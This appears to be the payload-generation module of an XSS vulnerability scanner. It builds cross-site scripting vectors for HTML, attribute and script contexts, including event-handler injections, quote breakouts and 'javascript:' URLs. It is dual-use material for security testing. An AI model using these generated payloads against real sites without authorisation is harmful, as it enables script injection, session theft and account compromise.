from core.config import xsschecker, badTags, fillings, eFillings, lFillings, jFillings, eventHandlers, tags, functions
from core.jsContexter import jsContexter
from core.utils import randomUpper as r, genGen, extractScripts


def generator(occurences, response):
    """
    Generates XSS payload vectors based on the identified vulnerable contexts in the response.

    Args:
        occurences (dict): A dictionary containing vulnerability occurrences with their context and scores.
        response (str): The HTTP response body from which scripts are extracted.

    Returns:
        dict: A dictionary of XSS vectors, categorized by their score.
    """
    scripts = extractScripts(response)
    index = 0
    vectors = {11: set(), 10: set(), 9: set(), 8: set(), 7: set(),
               6: set(), 5: set(), 4: set(), 3: set(), 2: set(), 1: set()}

    for i in occurences:
        context = occurences[i]['context']

        if context == 'html':
            lessBracketEfficiency = occurences[i]['score']['<']
            greatBracketEfficiency = occurences[i]['score']['>']
            ends = ['//']
            badTag = occurences[i]['details']['badTag'] if 'badTag' in occurences[i]['details'] else ''
            if greatBracketEfficiency == 100:
                ends.append('>')
            if lessBracketEfficiency:
                payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, badTag)
                for payload in payloads:
                    vectors[10].add(payload)

        elif context == 'attribute':
            found = False
            tag = occurences[i]['details']['tag']
            Type = occurences[i]['details']['type']
            quote = occurences[i]['details']['quote'] or ''
            attributeName = occurences[i]['details']['name']
            attributeValue = occurences[i]['details']['value']
            quoteEfficiency = occurences[i]['score'].get(quote, 100)
            greatBracketEfficiency = occurences[i]['score']['>']
            ends = ['//']

            # Handle efficiency cases for generating payloads
            if greatBracketEfficiency == 100:
                ends.append('>')

            if greatBracketEfficiency == 100 and quoteEfficiency == 100:
                payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends)
                for payload in payloads:
                    payload = quote + '>' + payload
                    found = True
                    vectors[9].add(payload)

            if quoteEfficiency == 100:
                for filling in fillings:
                    for function in functions:
                        vector = quote + filling + r('autofocus') + filling + r('onfocus') + '=' + quote + function
                        found = True
                        vectors[8].add(vector)

            if quoteEfficiency == 90:
                for filling in fillings:
                    for function in functions:
                        vector = '\\' + quote + filling + r('autofocus') + filling + r('onfocus') + '=' + function + filling + '\\' + quote
                        found = True
                        vectors[7].add(vector)

            # Handle specific attributes
            if Type == 'value':
                if attributeName == 'srcdoc':
                    if occurences[i]['score']['<']:
                        if occurences[i]['score']['>']:
                            del ends[:]
                            ends.append('%26gt;')
                        payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends)
                        for payload in payloads:
                            found = True
                            vectors[9].add(payload.replace('<', '%26lt;'))

                elif attributeName == 'href' and attributeValue == xsschecker:
                    for function in functions:
                        found = True
                        vectors[10].add(r('javascript:') + function)

                elif attributeName.startswith('on'):
                    closer = jsContexter(attributeValue)
                    quote = ''
                    for char in attributeValue.split(xsschecker)[1]:
                        if char in ['\'', '"', '`']:
                            quote = char
                    vectors[11].add(attributeValue.replace(xsschecker, closer))

        elif context == 'script':
            payloads = jsContexter(occurences[i], scripts, index)
            index += 1
            for payload in payloads:
                vectors[11].add(payload)

    return vectors
